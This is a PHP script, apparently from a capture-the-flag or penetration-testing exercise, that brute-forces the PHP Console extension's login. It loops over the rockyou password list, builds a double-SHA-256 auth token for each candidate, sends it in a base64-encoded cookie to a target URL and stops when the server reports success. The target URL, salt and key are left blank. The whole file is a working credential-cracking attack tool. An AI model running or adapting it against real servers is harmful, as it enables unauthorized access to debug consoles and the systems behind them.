<?php

define('_SALT', '');
define('_URL', '');
define('_KEY', '');
define('_PASSWORDS', '/usr/share/wordlists/rockyou.txt.gz');

echo getToken('poohbear');

// run();

function run() {
	$lines = gzfile(_PASSWORDS);
	foreach ($lines as $pass) {
		$pass = trim($pass);
		if (!isSuccess($pass)) {
			continue;
		}

		die('Found! ' . $pass);
	}
}

function isSuccess(string $password) {
	$response = getResponse($password);
	$match = '';
	preg_match('/"isSuccess":(true|false)/', $response, $match);

	return 'true' === $match[1];
}

function getResponse(string $password) {
	$options = [
		CURLOPT_HEADER => true,
		CURLOPT_HTTPHEADER => [getCookie($password)],
		CURLOPT_RETURNTRANSFER => true,
	];

	$ch = curl_init(_URL);
	curl_setopt_array($ch, $options);

	$content = curl_exec($ch);
	curl_close($ch);

	return $content;
}

function getCookie(string $password): string {
	$payload = getPayload($password);
	$cookie = 'Cookie: php-console-server=5; php-console-client=' . base64_encode($payload);

	return $cookie;
}

function getPayload(string $password): string {
	$token = getToken($password);

	$payloadRaw = [
		'php-console-client' => 5,
		'auth' => [
			'publicKey' => _KEY,
			'token' => $token,
		]
	];
	
	return json_encode($payloadRaw);
}

function getToken(string $password): string {
	$hashed = doHash($password . _SALT);
	$hashed = doHash($hashed . _KEY);

	return $hashed;
}

function doHash(string $raw): string {
	return hash('sha256', $raw);
}
